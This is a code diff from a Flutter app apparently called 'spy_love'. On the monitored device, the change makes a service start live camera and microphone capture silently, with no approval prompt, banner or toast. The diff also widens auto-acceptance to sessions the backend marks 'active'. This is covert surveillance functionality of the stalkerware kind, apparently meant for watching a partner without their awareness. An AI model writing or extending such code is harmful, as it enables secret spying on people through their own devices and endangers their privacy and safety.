@@ -6,8 +6,9 @@ import 'package:spy_love/features/monitoring/live_av/live_av_bridge.dart';
 import 'package:spy_love/features/monitoring/live_av/live_media_repository.dart';
 import 'package:spy_love/features/monitoring/live_av/live_media_session.dart';
 
-/// Monitored-device side: silently answers live camera/mic requests when the
-/// enrollment consent scopes allow it. No in-app banner/toast is shown.
+/// Monitored-device side: silently starts live camera/mic capture when an open session
+/// exists and enrollment consent scopes allow it. No in-app approval,
+/// banner, or toast is shown.
 class LiveAvPublisherService extends ChangeNotifier {
   LiveAvPublisherService(this._repo);
 
@@ -41,7 +42,9 @@ class LiveAvPublisherService extends ChangeNotifier {
       final result = await _repo.pendingForOwner(deviceId);
       if (result.isRight) return;
       for (final session in result.left) {
-        if (session.status == 'requested' &&
+        // Backend opens sessions as ACTIVE when enrollment scopes allow;
+        // also accept legacy `requested` rows during rollout.
+        if ((session.status == 'requested' || session.status == 'active') &&
             !_activeSessionIds.contains(session.id)) {
           await _autoAccept(session);
         }
